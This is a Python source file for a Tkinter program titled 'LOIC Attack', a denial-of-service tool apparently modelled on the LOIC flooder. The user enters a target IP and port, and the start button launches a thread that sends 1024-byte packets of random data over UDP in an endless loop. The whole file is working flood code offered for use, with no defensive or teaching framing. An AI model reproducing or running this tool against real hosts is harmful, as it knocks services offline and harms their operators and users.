import tkinter as tk
import socket
import threading
import random
import webbrowser

class LOIC:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 0
        self.sock = None  # Initialize the socket to None
        self.attack_thread = None
    
    def send_packet(self):
        while True:
            try:
                if self.sock:  # Check if the socket is initialized
                    message = random._urandom(1024)  # Generate random data
                    self.sock.sendto(message, (self.target_ip, self.target_port))
                    print(f"Packet sent to {self.target_ip}:{self.target_port}")
                else:
                    print("Socket is not initialized.")
                    break
            except Exception as e:
                print(f"Error sending packet: {e}")
                break

    def start_attack(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create a new socket
        self.attack_thread = threading.Thread(target=self.send_packet)
        self.attack_thread.start()

    def stop_attack(self):
        if self.sock:  # Check if the socket is initialized
            self.sock.close()
        self.sock = None  # Reset the socket to None when the attack is stopped

def start_attack():
    loic.start_attack()

def stop_attack():
    loic.stop_attack()

def set_target():
    ip_port = ip_port_entry.get().split(":")
    loic.target_ip = ip_port[0]
    loic.target_port = int(ip_port[1])

def open_vscode():
    webbrowser.open("https://code.visualstudio.com/")

# Create GUI
root = tk.Tk()
root.title("LOIC Attack")

ip_port_label = tk.Label(root, text="IP:Port")
ip_port_label.pack()
ip_port_entry = tk.Entry(root)
ip_port_entry.pack()

set_target_button = tk.Button(root, text="Set Target", command=set_target)
set_target_button.pack()

start_button = tk.Button(root, text="Start Attack", command=start_attack)
start_button.pack()

stop_button = tk.Button(root, text="Stop Attack", command=stop_attack)
stop_button.pack()

vscode_button = tk.Button(root, text="Open in VS Code", command=open_vscode)
vscode_button.pack()

# Initialize LOIC
loic = LOIC()

root.mainloop()
